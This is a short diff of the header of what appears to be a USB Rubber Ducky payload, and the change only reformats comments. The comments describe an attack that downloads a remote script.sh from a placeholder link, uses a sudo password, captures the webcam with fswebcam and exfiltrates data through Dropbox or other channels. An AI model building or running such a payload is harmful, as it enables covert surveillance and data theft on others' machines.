@@ -10,15 +10,15 @@ REM #                                                |
 REM ##################################################
 
 REM Requirements:
-REM     - REQUIREMENTS:
-REM         - Internet Connection
-REM         - Dropbox Token for example, but you can use whatever you want for the exfiltration (i.e. smtp e-mail, Discord, Telegram and so on..)
-REM         - sudo permissions
-REM             - if you need to install 'fswebcam'
-REM             - for add the -x permission to the script.sh downloaded
+REM     - Internet Connection
+REM     - Dropbox Token for example, but you can use whatever you want for the exfiltration (i.e. smtp e-mail, Discord, Telegram and so on..)
+REM     - sudo permissions
+REM         - if you need to install 'fswebcam'
+REM         - for add the -x permission to the script.sh downloaded
 
 REM REQUIRED - replace example.com with your script.sh link
 DEFINE SCRIPT-SH-LINK example.com
+
 REM REQUIRED - sudo Password
 DEFINE SUDO-PSWD example
 
